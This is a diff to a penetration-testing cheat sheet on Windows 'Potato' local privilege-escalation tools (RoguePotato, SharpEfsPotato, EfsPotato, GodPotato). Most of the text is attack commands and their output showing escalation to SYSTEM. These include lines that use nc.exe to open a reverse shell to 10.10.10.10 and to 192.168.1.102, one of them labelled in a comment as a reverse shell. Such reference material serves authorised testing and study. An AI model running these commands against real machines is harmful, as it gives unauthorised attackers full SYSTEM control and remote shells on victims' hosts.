@@ -63,8 +63,8 @@ c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f
 
 ### SharpEfsPotato
 
-```
-SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
+```bash
+> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
 SharpEfsPotato by @bugch3ck
   Local privilege escalation from SeImpersonatePrivilege using EfsRpc.
 
@@ -84,8 +84,8 @@ nt authority\system
 
 ### EfsPotato
 
-```
-EfsPotato.exe "whoami"
+```bash
+> EfsPotato.exe "whoami"
 Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
 Part of GMH's fuck Tools, Code By zcgonvh.
 CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]
@@ -103,9 +103,10 @@ nt authority\system
 
 ### GodPotato
 
-```
-GodPotato -cmd "cmd /c whoami"
-GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
+```bash
+> GodPotato -cmd "cmd /c whoami"
+# You can achieve a reverse shell like this.
+> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
 
 ## References
